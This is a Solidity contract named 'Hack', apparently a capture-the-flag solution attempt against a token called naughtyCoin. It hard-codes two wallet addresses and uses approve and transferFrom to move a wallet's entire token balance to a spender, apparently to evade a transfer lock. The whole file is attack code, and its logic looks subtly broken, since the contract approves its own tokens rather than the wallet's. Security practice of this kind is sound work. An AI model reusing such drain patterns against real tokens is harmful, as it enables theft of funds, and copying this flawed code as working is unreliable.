// SPDX-License-Identifier: MIT
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
pragma solidity ^0.8.0;
contract Hack{
    IERC20 public naughtyCoin;
    address myWallet = 0xdB01d94217308046a792D864b16A35837aa52B86;
    address spender = 0xceA707280e428AD529053623093Ec9B83eDA84b4;
    constructor(address _address) {
        naughtyCoin = IERC20(_address);
    }
    function balance() public returns (uint){
        uint amount = naughtyCoin.balanceOf(myWallet);
        return amount;
    }
    function hackContract() public payable{
        naughtyCoin.approve(spender, balance());
        
    }
    function spend() public payable{
        naughtyCoin.transferFrom(myWallet, spender, balance());
    }
    
}

